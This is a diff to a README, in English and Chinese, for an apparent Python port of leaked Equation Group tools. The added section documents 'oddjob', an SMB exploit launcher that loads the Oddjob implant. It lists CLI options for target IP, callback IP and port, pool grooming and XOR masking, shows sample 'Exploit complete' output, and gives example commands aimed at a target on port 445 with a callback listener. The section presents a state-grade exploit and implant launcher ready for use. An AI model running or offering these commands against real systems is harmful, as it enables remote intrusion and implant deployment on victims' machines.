@@ -161,6 +161,42 @@ The optional 3rd argument (IP) is parsed but ignored.
 nsa-equation-py setourip in.bin out.bin
 ```
 
+### oddjob — Oddjob (SMB) 利用
+
+Python port of `oddjob_v3_x86.exe` / `oddjob_v3_x64.exe` (C++/.NET 混合)，位于
+`EQGRP_Lost_in_Translation-master/oddjob/Binaries/oddjob_builder/bin/`。
+
+该工具是 Oddjob 植入框架的启动器：设置异常处理、获取系统架构信息、
+创建线程并加载原生植入模块（oddjob_v3_x86.dll / oddjob_v3_x64.dll）。
+建立在 nsa_equation/dave 统一协议库之上。
+
+CLI:
+
+  oddjob <target_ip> [target_port] [callback_ip] [callback_port] [options]
+
+  target_ip          目标主机 IP
+  target_port        目标端口（默认 445）
+  callback_ip        回调 IP
+  callback_port      回调端口
+  --groom              非分页池 groom 分配数（默认 400）
+  --max-attempts       最大尝试次数（默认 10）
+  --network-timeout    网络超时秒数（默认 30）
+  --xor-mask           EGG XOR 掩码（默认 0）
+
+输出示例：
+
+  [*] Oddjob (Oddjob v3) - Python port (DAVE 库)
+  [*] Target: 192.168.1.5:445
+  [+] Callback: 10.0.0.1:4444
+  [+] Groom allocations: 400
+  [+] Max attempts: 10
+  [*] Exploit complete
+
+```bash
+nsa-equation-py oddjob 192.168.1.5 445   # listener on :445
+nsa-equation-py oddjob 192.168.1.5 445 -l 10.0.0.5 -y
+```
+
 ### ds_parselogs — DSky 抓包文件分片
 
 Python port of `DS_ParseLogs.exe` (DSky/Tools 套件, C++/MSVCRT)。按标准 pcap 文件头
